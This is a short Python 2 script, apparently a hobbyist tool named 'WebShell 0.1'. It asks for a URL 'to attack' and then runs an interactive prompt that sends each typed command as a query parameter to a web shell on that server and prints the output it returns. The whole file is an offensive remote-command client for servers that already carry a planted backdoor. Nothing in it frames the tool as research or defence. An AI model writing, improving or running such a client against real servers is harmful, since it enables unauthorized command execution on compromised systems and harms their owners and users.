# usr/bin/python 
#import requests
import sys
import os
import urllib  
import json
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("-u", help="Url to attack")
args = parser.parse_args()

print """ ___           ___           ___           ___           ___     
	     /\  \         /\__\         /\  \         /\  \         /\  \    
	    /::\  \       /:/  /        /::\  \       /::\  \        \:\  \   
	   /:/\:\  \     /:/__/        /:/\:\  \     /:/\ \  \        \:\  \  
	  /:/  \:\  \   /::\  \ ___   /:/  \:\  \   _\:\~\ \  \       /::\  \ 
	 /:/__/_\:\__\ /:/\:\  /\__\ /:/__/ \:\__\ /\ \:\ \ \__\     /:/\:\__\

	  \:\ \:\__\        \::/  /   \:\  /:/  /   \:\ \:\__\     /:/  /     
	   \:\/:/  /        /:/  /     \:\/:/  /     \:\/:/  /     \/__/      
	    \::/  /        /:/  /       \::/  /       \::/  /                 
	     \/__/         \/__/         \/__/         \/__/"""
print " *-------------------- WebShell 0.1 @matiasmenares --------------------*"
print ""
print " "
if args.u:
    url = args.u
    
def conect():
	targer = urllib.urlopen(url)
	if targer.getcode() == 200:
		return True
	else:
		return False
if conect() == False:
	print "No response"
	sys.exit(2)

def target(url):
	targer = urllib.urlopen(url+"?a="+input)
	if targer.getcode() == 200:
		htmlSource = targer.read()
		j = json.loads(htmlSource)
		return j
	else:
		print "No response"
		sys.exit(2)


def terminal(input):
	if input == "exit":
		print "Bye :)"
		sys.exit(2)
	return target(url)

while True:
	input = raw_input("#>")
	termina = terminal(input)
	print termina['command']
